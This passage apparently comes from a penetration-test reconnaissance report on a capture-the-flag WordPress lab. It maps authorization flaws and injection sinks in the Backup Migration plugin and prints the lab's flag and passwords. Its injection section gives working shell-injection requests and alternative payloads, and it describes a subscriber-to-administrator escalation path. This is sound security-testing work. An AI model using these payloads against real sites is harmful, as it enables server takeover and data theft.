- Location: `/wordpress/wp-content/plugins/backup-backup/includes/database/search-replace.php:119-120`

---

## 6. Network & Interaction Map

**Network Surface Focus:** This section maps ONLY network-accessible components within the attack surface scope. All local development environments, build CI systems, and local-only tools have been excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| External Attacker | ExternAsset | Internet | N/A | None | Threat actor with internet access only |
| WordPress Application | Service | App | Apache 2.4.65 / PHP 8.3.27 | PII, Tokens, Secrets | Main application backend, port 45513 |
| MySQL Database | DataStore | Data | MySQL 8.0 | PII, Tokens, Hashes | Stores user data, sessions, content |
| Backup Storage | DataStore | App | Filesystem | Full DB Dumps, Credentials | `/wp-content/backup-migration-eh8dobKJWN/` directory |
| Staging Environment | Service | App | WordPress (duplicate) | PII, Tokens | Database-level staging via `b06mi12_stg79618_*` tables |
| Flag Storage | DataStore | App | Filesystem | CTF Flag | `/opt/flag.txt` within WordPress container |
| WordPress Core | Service | App | PHP | Public | Core WordPress functionality |
| Backup Plugin | Service | App | PHP | Sensitive | Backup Migration plugin (vulnerable) |
| Akismet Plugin | Service | App | PHP | Spam Data | Anti-spam functionality |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| External Attacker | Capabilities: Network access to port 45513; Knowledge: Public CVE database, WordPress documentation; Privileges: None initially; Goal: Read /opt/flag.txt |
| WordPress Application | Hosts: `http://localhost:45513`; Endpoints: `/wp-login.php`, `/wp-admin/admin-ajax.php`, `/xmlrpc.php`, `/wp-json/*`, `/?backup-migration=*`; Auth: Cookie-based session, HTTP Basic Auth (app passwords), XML-RPC; Dependencies: MySQL Database, Backup Storage, Flag Storage; Version: WordPress 6.5.4; Language: PHP 8.3.27; Web Server: Apache 2.4.65 |
| MySQL Database | Engine: MySQL 8.0; Exposure: Internal Docker network only (port 3306); Consumers: WordPress Application; Credentials: DB_USER=wordpress, DB_PASSWORD=wordpress (CRITICAL: weak credentials); Root Password: root_password; Tables: 67+ (24 WordPress core + plugin tables + 12 staging tables); Encryption: None (plaintext traffic); Character Set: utf8mb4_unicode_520_ci |
| Backup Storage | Location: `/wp-content/backup-migration-eh8dobKJWN/`; Access Control: .htaccess (Apache-dependent); Current Files: `BM_Backup_2024-06-12_07_33_40_GXqBuZDysjW4Hpx6.zip` (12MB); Contents: Full site backup including database with password hashes, wp-config.php with secret keys, all files; Public Access: Conditional (if STORAGE::DIRECT::URL='true'); Log Files: `latest_full.log`, `latest_progress.log` (time-based public access < 5 minutes) |
| Staging Environment | Type: Database-level duplicate; Tables: `b06mi12_stg79618_*` prefix; URL: `http://localhost/staging`; Created Via: Backup Migration plugin; Password: `oCpRaVpjuGnhVV6Gv0WIS0lB` (stored in `/wp-content/backup-migration-eh8dobKJWN/staging/6669572265146.php`); Isolation: None (same database instance) |
| Flag Storage | Location: `/opt/flag.txt`; Contents: `flag{baf4424d-ac6a-478e-b0bc-bdc0cf3edd33}`; Permissions: Likely www-data:www-data or root:root; Also Exposed As: FLAG environment variable in WordPress container; Access Methods: File read (LFI, SSRF file://), Command injection, Environment variable enumeration |
| WordPress Core | Version: 6.5.4; Release Date: 2024; PHP Version: 8.3.27; Core Files: 158 PHP files in wp-includes/; Authentication: PHPass (bcrypt/MD5-iterated), Session tokens (43-char, SHA-256 hashed); Missing Security Constants: DISALLOW_FILE_EDIT, FORCE_SSL_ADMIN, FORCE_SSL_LOGIN, WP_AUTO_UPDATE_CORE |
| Backup Plugin | Name: Backup Migration; Version: v1.3.5; Vendor: Migrate / BackupBliss; Size: 2.9 MB (159 PHP files); Critical Vulnerabilities: 3 command injection, 3 SQL injection, 6 authorization bypass; AJAX Endpoints: 60+; Authorization Flaw: Uses is_admin() instead of capability checks |
| Akismet Plugin | Name: Akismet Anti-spam; Version: v5.3.2; Vendor: Automattic; Risk Level: Low (well-maintained); API Communication: Outbound HTTPS to Akismet servers; Data Transmitted: Comment content, author info, IP addresses |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| External Attacker → WordPress Application | HTTPS | `:45513 /wp-login.php` | None | Public |
| External Attacker → WordPress Application | HTTPS | `:45513 /wp-admin/admin-ajax.php` | **WEAK:** is_admin() + nonce (not capability-based) | PII, Tokens, Secrets |
| External Attacker → WordPress Application | HTTPS | `:45513 /?backup-migration=BMI_BACKUP` | **CONDITIONAL:** None if STORAGE::DIRECT::URL='true' | Full DB Dumps, Credentials |
| External Attacker → WordPress Application | HTTPS | `:45513 /?backup-migration=PROGRESS_LOGS` | **TIME-BASED:** None if file < 5 min old | System Info, Paths |
| External Attacker → WordPress Application | HTTPS | `:45513 /?backup-migration=AFTER_RESTORE` | **CRITICAL:** Predictable time+IP+token | Full Admin Access |
| Authenticated User → WordPress Application | HTTPS | `:45513 /wp-admin/` | auth:user | PII |
| Authenticated User → WordPress Application | HTTPS | `:45513 /wp-admin/admin-ajax.php?action=backup_migration` | **WEAK:** is_admin() (not capability check) | PII, Tokens, Secrets, Command Execution |
| WordPress Application → MySQL Database | TCP | `:3306` | vpc-only | PII, Tokens, Secrets |
| WordPress Application → Backup Storage | File I/O | Filesystem | **WEAK:** .htaccess only | Full DB Dumps, Credentials |
| WordPress Application → Flag Storage | File I/O | `/opt/flag.txt` | **NONE:** File system permissions only | CTF Flag |
| Backup Plugin → Shell | exec() | PHP shell_exec, exec | **NONE:** No input validation | Command Execution, System Access |
| Backup Plugin → MySQL Database | SQL | Dynamic queries | **WEAK:** No prepared statements for table names | Database Compromise |
| WordPress Application → Akismet API | HTTPS | Outbound to Akismet servers | API Key | Spam Data |
| WordPress Core → WordPress.org | HTTPS | Outbound to api.wordpress.org | None | Version Info, Updates |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| auth:user | Auth | Requires valid WordPress session cookie OR application password via HTTP Basic Auth. Validated via wp_validate_auth_cookie() or wp_authenticate_application_password(). |
| auth:admin | Auth | **MISLEADING NAME** - In Backup plugin context, uses is_admin() which only checks if current page is in /wp-admin/ directory, NOT if user has admin privileges. CRITICAL VULNERABILITY. |
| auth:manager | Authorization | Requires 'manage_options' capability (WordPress administrator). Checked via current_user_can('manage_options'). |
| auth:super_admin | Authorization | Requires super administrator privileges in multisite installations. Bypasses most capability checks. |
| ownership:user | ObjectOwnership | **NOT IMPLEMENTED** in Backup plugin. WordPress core implements for posts/comments via map_meta_cap(). |
| ownership:backup | ObjectOwnership | **NOT IMPLEMENTED**. Backup files have no creator/owner tracking. Any authenticated user can access any backup. CRITICAL IDOR VULNERABILITY. |
| role:subscriber | Authorization | Lowest privilege level. Can only read public content and manage own profile. |
| role:contributor | Authorization | Can write and manage own posts but cannot publish. |
| role:author | Authorization | Can publish and manage own posts. |
| role:editor | Authorization | Can publish and manage all posts including others'. |
| role:administrator | Authorization | Full WordPress access including plugin management, user management, settings. |
| nonce:backup-migration-ajax | CSRF | Requires valid WordPress nonce for 'backup-migration-ajax' action. Lifetime: 24 hours (2 ticks × 12 hours). Validated via check_ajax_referer(). |
| token:bmi | Custom | Hardcoded token check: $_POST['token'] === 'bmi'. Static value, no rotation. Used in conjunction with is_admin() for Backup plugin access. |
| config:STORAGE::DIRECT::URL | Configuration | **CRITICAL BYPASS** - If set to 'true', allows unauthenticated backup downloads. Configuration-based authentication bypass. |
| time:5min_window | Time-Based | **WEAK AUTH** - Progress logs accessible to anyone if file modified within last 5 minutes. Race condition during backups. |
| time:autologin_window | Time-Based | **CRITICAL BYPASS** - Auto-login token valid for ±6 seconds around timestamp. Predictable token format: timestamp_IP_4u70L051n. |
| vpc-only | Network | Restricted to Docker internal network. MySQL port 3306 not exposed externally. |
| htaccess:apache | Access Control | **FRAGILE** - Backup directory protected by .htaccess (Apache-dependent). Fails silently on Nginx or misconfiguration. |

### 6.5 Trust Boundaries

**Boundary 1: Internet → WordPress Application (Port 45513)**
- **Security Controls:** NONE
- **Missing Controls:** No WAF, no rate limiting, no IP filtering, no HTTPS enforcement
- **Risk:** CRITICAL - All WordPress vulnerabilities directly exploitable
- **Attack Scenarios:** Brute force on /wp-login.php, XML-RPC amplification, plugin exploitation, credential stuffing

**Boundary 2: WordPress Application → MySQL Database (Port 3306)**
- **Security Controls:** Network isolation (Docker), hardcoded credentials
- **Credentials:** wordpress/wordpress (CRITICAL: trivially weak)
- **Encryption:** NONE - plaintext traffic
- **Risk:** HIGH - Configuration file disclosure grants full database access
- **Attack Scenarios:** wp-config.php read → database compromise, SQL injection → data exfiltration

**Boundary 3: WordPress Application → File System**
- **Security Controls:** Unix file permissions, .htaccess
- **Risk:** HIGH - .htaccess protection fails silently on misconfiguration
- **Backup Storage:** `/wp-content/backup-migration-eh8dobKJWN/` (12MB backup contains full database, credentials)
- **Missing:** DISALLOW_FILE_EDIT not set (admins can edit theme/plugin files = RCE)

**Boundary 4: Application → Flag Storage (`/opt/flag.txt`)**
- **Security Controls:** File system permissions only
- **Risk:** CRITICAL - Multiple access vectors
- **Attack Paths:** Command injection → cat /opt/flag.txt, SSRF → file:///opt/flag.txt, LFI/path traversal, environment variable read

**Boundary 5: Authenticated User → Administrative Functions**
- **Security Controls:** **BROKEN** - Backup plugin uses is_admin() not capability checks
- **Risk:** CRITICAL - ANY authenticated user can perform admin operations
- **Impact:** Subscriber can create/restore backups, execute commands, access all data

---

## 7. Role & Privilege Architecture

This section maps the complete authorization model for vulnerability analysis.

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation | Capabilities Summary |
|-----------|----------------|--------------|---------------------|---------------------|
| anonymous | 0 | Global | N/A | No authentication. Can access public content, login/registration pages. |
| subscriber | 1 | Global | `wp_capabilities` meta: `a:1:{s:10:"subscriber";b:1;}` | Base authenticated user. Can read content, manage own profile. Capabilities: `read`, `subscriber` |
| contributor | 3 | Global | `wp_capabilities` meta: `a:1:{s:11:"contributor";b:1;}` | Can write and edit own posts but not publish. Capabilities: `edit_posts`, `read`, `delete_posts`, `contributor` |
| author | 5 | Global | `wp_capabilities` meta: `a:1:{s:6:"author";b:1;}` | Can publish and manage own posts. Capabilities: `upload_files`, `edit_posts`, `edit_published_posts`, `publish_posts`, `read`, `delete_posts`, `delete_published_posts`, `author` |
| editor | 7 | Global | `wp_capabilities` meta: `a:1:{s:6:"editor";b:1;}` | Can publish and manage all posts including others'. Capabilities: `moderate_comments`, `manage_categories`, `manage_links`, `edit_others_posts`, `edit_pages`, `edit_others_pages`, `edit_published_pages`, `publish_pages`, `delete_pages`, `delete_others_pages`, `delete_published_pages`, `delete_others_posts`, `delete_private_posts`, `edit_private_posts`, `read_private_posts`, `delete_private_pages`, `edit_private_pages`, `read_private_pages`, `editor` |
| administrator | 10 | Global | `wp_capabilities` meta: `a:1:{s:13:"administrator";b:1;}` | Full WordPress access. Capabilities: ALL (including `manage_options`, `install_plugins`, `edit_users`, `delete_users`, `edit_theme_options`, `import`, `export`, `unfiltered_html`) |
| do_backups (capability) | 8 | Global (Backup operations) | **NOT REGISTERED** - Checked but never added to any role | **ORPHANED CAPABILITY** - Plugin checks for this but never grants it. Fallback to 'administrator' role check. Location: `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:120` |

**Role Storage:** WordPress stores roles in `wp_usermeta` table with meta_key `wp_capabilities` as serialized PHP arrays.

**Code Implementation Locations:**
- Role definitions: `/wordpress/wp-includes/capabilities.php` (WordPress core RBAC)
- Role assignment: `/wordpress/wp-admin/includes/user.php` (edit_user function)
- Capability checks: `/wordpress/wp-includes/capabilities.php:293-368` (has_cap method)

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anonymous → subscriber → contributor → author → editor → administrator

Privilege Levels (0-10 scale):
anonymous (0) < subscriber (1) < contributor (3) < author (5) < editor (7) < administrator (10)

Capability-Based Lattice:
- subscriber: read
- contributor: subscriber + edit_posts + delete_posts
- author: contributor + publish_posts + upload_files
- editor: author + edit_others_posts + manage_categories + moderate_comments
- administrator: editor + manage_options + install_plugins + edit_users

Parallel Isolation:
NONE - WordPress uses strict hierarchy, no parallel roles by default

**CRITICAL FINDING - Broken Hierarchy in Backup Plugin:**
Due to is_admin() misuse, the effective privilege lattice is:

ANY authenticated user in /wp-admin/ = Full Backup Plugin Access (Level 10 operations)
```

**Role Switching Mechanisms:**
- **Standard:** NONE - WordPress does not support native role switching
- **Impersonation:** NONE - No built-in admin impersonation features
- **Sudo Mode:** NONE - No temporary privilege elevation
- **Backup Plugin Auto-Login:** ⚠️ **CRITICAL** - Automatic administrator login after restore
  - Token: `timestamp_IP_4u70L051n`
  - Window: ±6 seconds
  - Location: `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:996-1046`
  - **This is effectively a privilege escalation vulnerability**

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method | Initial Access |
|------|---------------------|--------------------------|----------------------|----------------|
| anonymous | `/` (homepage) | `/`, `/wp-login.php`, `/wp-json/*` (public endpoints), `/?p=[post_id]`, `/xmlrpc.php` | None | Direct access |
| subscriber | `/wp-admin/` → redirects to `/wp-admin/profile.php` | `/`, `/wp-admin/profile.php`, `/wp-admin/admin-ajax.php`, `/wp-json/*` (authenticated endpoints) | Session cookie / Application password | Via `/wp-login.php` |
| contributor | `/wp-admin/` → Dashboard | `/wp-admin/*`, `/wp-admin/post-new.php`, `/wp-admin/edit.php`, `/wp-admin/admin-ajax.php`, `/wp-json/wp/v2/posts` (own posts) | Session cookie / Application password | Via `/wp-login.php` |
| author | `/wp-admin/` → Dashboard | All contributor routes + `/wp-admin/upload.php`, `/wp-json/wp/v2/media` | Session cookie / Application password | Via `/wp-login.php` |
| editor | `/wp-admin/` → Dashboard | All author routes + `/wp-admin/edit.php?post_type=page`, `/wp-admin/edit-comments.php`, `/wp-json/wp/v2/*` (all content) | Session cookie / Application password | Via `/wp-login.php` |
| administrator | `/wp-admin/` → Dashboard | **ALL ROUTES** including `/wp-admin/plugins.php`, `/wp-admin/users.php`, `/wp-admin/options-general.php`, `/wp-admin/themes.php`, `/wp-json/wp/v2/*`, **`/?backup-migration=*`** | Session cookie / Application password | Via `/wp-login.php` |

**Backup Plugin Access (ALL authenticated users due to is_admin() flaw):**
- Entry: `/wp-admin/` (must be in admin area for is_admin() to return true)
- Routes: `/wp-admin/admin-ajax.php?action=backup_migration&f=*` (60+ functions)
- **CRITICAL:** Subscriber can access same backup functions as Administrator

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location | Validation Code |
|------|------------------|-------------------|------------------|-----------------|
| subscriber | WordPress core auth | `current_user_can('read')` | `wp_usermeta.meta_value` where `meta_key='wp_capabilities'` | `/wordpress/wp-includes/capabilities.php:293` (has_cap method) |
| contributor | WordPress core auth | `current_user_can('edit_posts')` | Same as above | Same as above |
| author | WordPress core auth | `current_user_can('publish_posts')` | Same as above | Same as above |
| editor | WordPress core auth | `current_user_can('edit_others_posts')` | Same as above | Same as above |
| administrator | WordPress core auth | `current_user_can('manage_options')` OR `in_array('administrator', $user->roles)` | Same as above | Same as above + `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:120` |

**Backup Plugin Authorization Check (BROKEN):**
```php
// Location: /wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297
if ((isset($_POST['token']) && $_POST['token'] == 'bmi' && isset($_POST['f']) && is_admin()) || $cli) {
    // Allow access to ALL backup functions
}

// SHOULD BE:
if ((isset($_POST['token']) && $_POST['token'] == 'bmi' && isset($_POST['f']) && current_user_can('manage_options')) || $cli) {
    // Allow access to ALL backup functions
}
```

**is_admin() Definition:**
```php
// Location: /wordpress/wp-includes/load.php:935-947
function is_admin() {
    if ( isset( $GLOBALS['current_screen'] ) ) {
        return $GLOBALS['current_screen']->in_admin();
    } elseif ( defined( 'WP_ADMIN' ) ) {
        return WP_ADMIN;  // Returns TRUE if in /wp-admin/ directory
    }
    return false;
}
```

**Impact:** Any user who navigates to `/wp-admin/` makes `is_admin()` return true, granting access to ALL backup operations.

---

## 8. Authorization Vulnerability Candidates

This section identifies specific endpoints and patterns prime for authorization testing, organized by vulnerability type.

### 8.1 Horizontal Privilege Escalation Candidates (IDOR)

**Priority: HIGH** - Endpoints with object IDs where users can access other users' resources

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity | Exploitation Scenario |
|----------|-----------------|---------------------|-----------|-------------|----------------------|
| **CRITICAL** | `/?backup-migration=BMI_BACKUP&backup-id=[filename]` | backup-id | backup_file | **CRITICAL** - Full DB dump | **Direct IDOR:** Any authenticated user (or unauthenticated if STORAGE::DIRECT::URL='true') can download ANY backup file by iterating filenames. No creator/owner tracking. Location: `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:1048-1114` |
| **CRITICAL** | `/?backup-migration=AFTER_RESTORE&backup-id=[timestamp]&progress-id=[token]` | backup-id, progress-id | autologin_token | **CRITICAL** - Admin access | **Predictable Token:** Token format `timestamp_IP_4u70L051n` allows brute-forcing. ±6 second window. Auto-login as administrator. Location: Lines 996-1046 |
| **HIGH** | `/wp-admin/admin-ajax.php?action=backup_migration&f=delete-backup&filenames=[array]` | filenames | backup_file | **HIGH** - DoS, data loss | **IDOR:** User can delete ANY backup file, no ownership check. Path traversal via weak regex at line 1672: `$file = preg_replace('/\.\./', '', $file);` |
| **HIGH** | `/wp-admin/admin-ajax.php?action=backup_migration&f=unlock-backup` | None (implicit) | lock_state | **HIGH** - Workflow bypass | **IDOR:** User can unlock ANY backup operation, not just their own. No operation ownership tracking. |
| **HIGH** | `/wp-admin/admin-ajax.php?action=backup_migration&f=download-backup&url=[url]` | url | remote_backup | **HIGH** - SSRF + RCE | **IDOR + SSRF:** User can trigger download from arbitrary URL, no validation. Command injection at line 1513. Location: Lines 1481-1635 |
| **HIGH** | `/wp-admin/admin-ajax.php?action=backup_migration&f=get-current-backups` | None | backup_list | **HIGH** - Enumeration | **Information Disclosure:** Lists ALL backup files regardless of creator. No filtering by user. |
| **MEDIUM** | `/?backup-migration=PROGRESS_LOGS&backup-id=[type]&progress-id=[logfile]` | progress-id | log_file | **MEDIUM** - Info disclosure | **Time-Based IDOR:** Logs accessible to anyone if < 5 minutes old. Contains file paths, DB structure, errors. Location: Lines 1159-1285 |
| **MEDIUM** | `/?backup-migration=BMI_BACKUP_LOGS&backup-id=[filename]` | backup-id | log_data | **MEDIUM** - Info disclosure | **IDOR:** Administrator can extract logs from ANY backup ZIP. No ownership check. Location: Lines 1115-1157 |
| **MEDIUM** | `/wp-admin/admin-ajax.php?action=backup_migration&f=staging-prepare-login` | None (implicit) | staging_token | **MEDIUM** - Lateral movement | **IDOR:** User can generate auto-login token for staging site. No ownership validation. |

**WordPress Core IDOR Protection (Working Correctly):**
- Posts: `current_user_can('edit_post', $post_id)` checks ownership via `map_meta_cap()`
- Users: `current_user_can('edit_user', $user_id)` checks self-edit or higher privilege
- Comments: `current_user_can('edit_comment', $comment_id)` checks comment author
- Media: `current_user_can('edit_attachment', $attachment_id)` checks uploader

**Backup Plugin IDOR Failures:**
- **NO ownership model** - Backup files have no `created_by` field
- **NO creator tracking** - No record of which user created which backup
- **NO access control lists** - All authenticated users see all backups
- **NO resource-level authorization** - Only global `is_admin()` check (broken)

### 8.2 Vertical Privilege Escalation Candidates

**Priority: CRITICAL** - Endpoints requiring higher privileges, exploitable due to `is_admin()` misuse

**Due to Backup Plugin Authorization Flaw:** ALL backup operations are vertical escalation vectors for non-administrator roles.

| Target Role | Endpoint Pattern | Functionality | Risk Level | Should Require | Actually Requires |
|-------------|-----------------|---------------|----------|----------------|-------------------|
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=create-backup` | Full site backup creation | **CRITICAL** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup` | Site restoration (complete takeover) | **CRITICAL** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=save-storage&directory=[path]` | Arbitrary directory creation | **CRITICAL** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options&php_cli_manual_path=[path]` | Set PHP CLI path (RCE vector) | **CRITICAL** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=download-backup&url=[url]` | SSRF + Command injection | **CRITICAL** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=delete-backup` | Delete any backup file | **HIGH** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=staging-local-creation-process` | Create staging environment | **HIGH** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=staging-delete-permanently` | Delete staging environment | **HIGH** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=reset-configuration` | Reset plugin configuration | **MEDIUM** | `manage_options` capability | **Any user in /wp-admin/** |
| administrator | `/wp-admin/admin-ajax.php?action=backup_migration&f=get-site-data` | Retrieve sensitive site info | **MEDIUM** | `manage_options` capability | **Any user in /wp-admin/** |

**Exploitation Path (Subscriber → Administrator):**
```
1. Authenticate as Subscriber (lowest privilege)
2. Navigate to /wp-admin/ (triggers is_admin() = true)
3. POST to /wp-admin/admin-ajax.php:
   - action=backup_migration
   - token=bmi
   - f=restore-backup
   - file=malicious-backup.zip (contains modified wp_users table with new admin account)
   - nonce=[valid_nonce] (obtained from /wp-admin/ page)
4. Result: New administrator account created via restore
5. Complete privilege escalation achieved
```

**WordPress Core Vertical Escalation Protection (Working):**
- Plugins page: `current_user_can('activate_plugins')` - Administrator only
- Users page: `current_user_can('list_users')` - Administrator only
- Settings: `current_user_can('manage_options')` - Administrator only
- Theme editor: `current_user_can('edit_themes')` - Administrator only

### 8.3 Context-Based Authorization Candidates

**Priority: MEDIUM** - Multi-step workflows that assume prior steps completed

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Risk Level |
|----------|----------|---------------------|------------------|-----------|
| Backup Restoration | `/wp-admin/admin-ajax.php?action=backup_migration&f=continue_restore_process` | Restore initiated, database imported, BMI_RESTORE_SECRET set | **MEDIUM:** If attacker can set BMI_RESTORE_SECRET constant, can skip validation steps | Can manipulate post-restore hooks, inject code |
| Auto-Login After Restore | `/?backup-migration=AFTER_RESTORE&backup-id=[timestamp]&progress-id=[token]` | Restore completed ≤6 seconds ago, autologin file created | **CRITICAL:** Time window + IP + predictable token allows complete bypass | Direct administrator login, no password required |
| Progress Log Access | `/?backup-migration=PROGRESS_LOGS&progress-id=[logfile]` | Backup/restore operation active within last 5 minutes | **HIGH:** Race condition - attacker can time requests during operations | Information disclosure of system paths, DB structure |
| Backup Download (Direct URL) | `/?backup-migration=BMI_BACKUP&backup-id=[filename]` | STORAGE::DIRECT::URL configuration enabled | **CRITICAL:** Configuration bypass - no authentication if enabled | Full site backup download without authentication |
| Staging Auto-Login | `/wp-admin/admin-ajax.php?action=backup_migration&f=staging-prepare-login` | Staging site created | **MEDIUM:** Can generate login token for staging without proper authorization | Access staging admin without credentials |
| Backup Upload Completion | Chunked upload via `f=upload-backup` | All chunks uploaded, integrity verified | **LOW:** Plugin validates chunk sequence and manifest | Malicious ZIP upload, but proper validation exists |

**Workflow State Validation Gaps:**

1. **Auto-Login Token Creation:**
   - Location: `/wordpress/wp-content/plugins/backup-backup/includes/ajax.php:1097,1153,1175`
   - Token format: `time() . '_' . $ip . '_' . '4u70L051n'`
   - **Gap:** Static suffix, predictable timestamp
   - **Bypass:** Brute force timestamp ±6 seconds, guess IP (often localhost/proxy IP)

2. **Restore Secret Validation:**
   - Location: `/wordpress/wp-content/plugins/backup-backup/includes/restore-batching.php:191,200`
   - Check: `strlen($_POST['bmi_restore_secret']) == '64'` + comparison with stored secret
   - **Gap:** If attacker controls backup file, can inject known secret
   - **Bypass:** Upload malicious backup with embedded secret, trigger restore continuation

3. **Progress Log Time Window:**
   - Location: `/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:1194,1215,1236,1258`
   - Check: `((time() - filemtime($progress)) < (60 * 5)) || current_user_can('administrator')`
   - **Gap:** File modification time determines access, not operation state
   - **Bypass:** Trigger backup operation, immediately access logs (< 5 min window)

4. **Configuration-Based Authentication:**
   - Location: Line 1049
   - Check: `Dashboard\bmi_get_config('STORAGE::DIRECT::URL') === 'true' || current_user_can('administrator')`
   - **Gap:** Configuration value grants authentication bypass
   - **Bypass:** If attacker can modify configuration (via backup restore), enables unauthenticated access

---

## 9. Injection Sources (Command Injection and SQL Injection)

**CRITICAL:** This section contains complete data flow analysis from network-accessible entry points to dangerous sinks.

**Network Surface Focus:** All sources listed below are accessible through network requests to the deployed application. Local-only CLI tools, build scripts, and development utilities have been excluded.

### Command Injection Sources

**CRITICAL #1: URL Parameter Command Injection in Quick Migration**

**Entry Point:** `$_POST['url']` via `/wp-admin/admin-ajax.php?action=backup_migration&f=download-backup`  
**Data Flow Path:**
```
1. /wordpress/wp-content/plugins/backup-backup/includes/ajax.php:52
   - $_POST sanitized via BMP::sanitize() → sanitize_text_field()
   
2. Line 89 - Routes to handleQuickMigration()

3. Line 1498 - Assigns to $url variable:
   $url = $this->post['url'];
   
4. Line 1513 - DIRECT INJECTION into exec():
   @exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" bmi_quick_migration "' . $url . '" > /dev/null &', $res);
```

**Sanitization Applied:**
- `sanitize_text_field()` - Removes HTML tags but preserves shell metacharacters
- **NO escapeshellarg()** or **escapeshellcmd()**

**Validation Applied:** NONE

**Dangerous Sink:** Line 1513  
**File:** `/wordpress/wp-content/plugins/backup-backup/includes/ajax.php`

**Exploitability:** **CRITICAL**
- URL wrapped in double quotes but not escaped
- Shell metacharacters preserved: `;`, `|`, `&`, `$()`, backticks
- Command substitution, variable expansion, command chaining all possible

**Exploit Example:**
```bash
POST /wp-admin/admin-ajax.php
Content-Type: application/x-www-form-urlencoded

action=backup_migration&token=bmi&f=download-backup&url=http://test";cat /opt/flag.txt > /tmp/pwned;"&nonce=[valid_nonce]

# Resulting command:
# php -f "/path/to/cli-handler.php" bmi_quick_migration "http://test";cat /opt/flag.txt > /tmp/pwned;"" > /dev/null &

# Execution flow:
# 1. php -f "/path/to/cli-handler.php" bmi_quick_migration "http://test"
# 2. cat /opt/flag.txt > /tmp/pwned
# 3. "" > /dev/null &
```

**Alternative Payloads:**
```bash
# Command substitution:
url=http://test";echo $(cat /opt/flag.txt);"

# Backticks:
url=http://test";`cat /opt/flag.txt > /tmp/out`;"

# Pipe to shell:
url=http://test"|/bin/bash -c 'cat /opt/flag.txt'"

# Variable expansion:
url=http://test";FLAG=$(cat /opt/flag.txt);echo $FLAG;"
```

---

**CRITICAL #2: Backup Filename Command Injection in Restore**

**Entry Point:** `$_POST['file']` via `/wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup`  
**Data Flow Path:**
```
1. /wordpress/wp-content/plugins/backup-backup/includes/ajax.php:52
   - $_POST sanitized via BMP::sanitize() → sanitize_text_field()
   
2. Line 95 - Routes to restoreBackup()

3. Line 1139 - Sanitizes filename:
   $backupName = sanitize_text_field($this->post['file']);
   
4. Line 1145 - UNQUOTED injection into exec():
   @exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" bmi_restore ' . $backupName . ' ' . $remoteType . ' > /dev/null &', $res);
```

**Sanitization Applied:**
- `sanitize_text_field()` - Removes HTML but preserves spaces and special characters

**Validation Applied:** NONE

**Dangerous Sink:** Line 1145  
**File:** `/wordpress/wp-content/plugins/backup-backup/includes/ajax.php`

**Exploitability:** **CRITICAL**
- Backup name **NOT quoted** in command
- Space-based injection: `backup.zip;whoami;`
- Semicolon terminates command: `backup.zip;cat /opt/flag.txt;#`

**Exploit Example:**
```bash
POST /wp-admin/admin-ajax.php
Content-Type: application/x-www-form-urlencoded

action=backup_migration&token=bmi&f=restore-backup&file=backup.zip;cat /opt/flag.txt > /tmp/pwned;#&nonce=[valid_nonce]

# Resulting command:
# php -f "/path/to/cli-handler.php" bmi_restore backup.zip;cat /opt/flag.txt > /tmp/pwned;# false > /dev/null &

# Execution flow:
# 1. php -f "/path/to/cli-handler.php" bmi_restore backup.zip
# 2. cat /opt/flag.txt > /tmp/pwned
# 3. # false > /dev/null & (commented out)
```

---

**HIGH #3: Backup Name Command Injection in Creation**

**Entry Point:** Backup name from configuration via `makeBackupName()`  
**Data Flow Path:**
```
1. /wordpress/wp-content/plugins/backup-backup/includes/ajax.php:605
   - $name = $this->makeBackupName();
   
2. Lines 638, 640 - UNQUOTED injection into exec():
   @exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" bmi_backup_cron ' . $name . ' > /dev/null &', $res);
   @exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" bmi_backup ' . $name . ' > /dev/null &', $res);
```

**Sanitization Applied:**
- Depends on backup name configuration
- Configuration has validation (lines 2025-2043): 3-40 chars, no spaces, forbidden special chars
- **Mitigation:** Strong validation in saveStorageTypeConfig() may prevent exploitation

**Validation Applied:** 
- Length check: 3-40 characters
- No spaces allowed
- Forbidden characters: `['/', '\\', '<', '>', ':', '"', "'", '|', '?', '*', '.', ';', '@', '!', '~', '`', ',', '#', '$', '&', '=', '+']`

**Dangerous Sink:** Lines 638, 640  
**File:** `/wordpress/wp-content/plugins/backup-backup/includes/ajax.php`

**Exploitability:** **MEDIUM**
- **Mitigated by configuration validation**
- If attacker can bypass validation or modify configuration directly, command injection possible
- Not quoted, so space/semicolon injection would work if validation bypassed

---

